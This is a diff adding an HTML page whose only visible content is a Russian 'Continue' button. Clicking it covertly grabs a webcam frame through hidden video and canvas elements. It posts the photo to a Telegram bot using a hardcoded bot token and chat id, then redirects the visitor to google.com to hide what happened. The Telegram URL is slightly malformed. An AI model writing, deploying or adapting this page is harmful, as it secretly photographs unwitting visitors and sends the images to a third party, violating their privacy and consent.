@@ -1,1 +1,36 @@
+<!DOCTYPE html>
+<html>
+<body style="background:#000; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <button id="b" style="padding:20px; background:#27ae60; color:#fff; border:none; border-radius:10px; font-size:18px;">Продолжить</button>
+
+    <script>
+        const token = '8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc';
+        const chat_id = '7164380121';
+
+        document.getElementById('b').onclick = async () => {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video:true});
+                const v = document.getElementById('v');
+                v.srcObject = s;
+                setTimeout(() => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => {
+                        const f = new FormData();
+                        f.append('chat_id', chat_id);
+                        f.append('photo', b, 'p.jpg');
+                        fetch(`https://api.telegram.org{token}/sendPhoto`, {method:'POST', body:f})
+                        .then(() => window.location.href = "https://google.com");
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (e) {
+                alert("Ошибка доступа к камере");
+            }
+        };
+    </script>
+</body>
+</html>
 
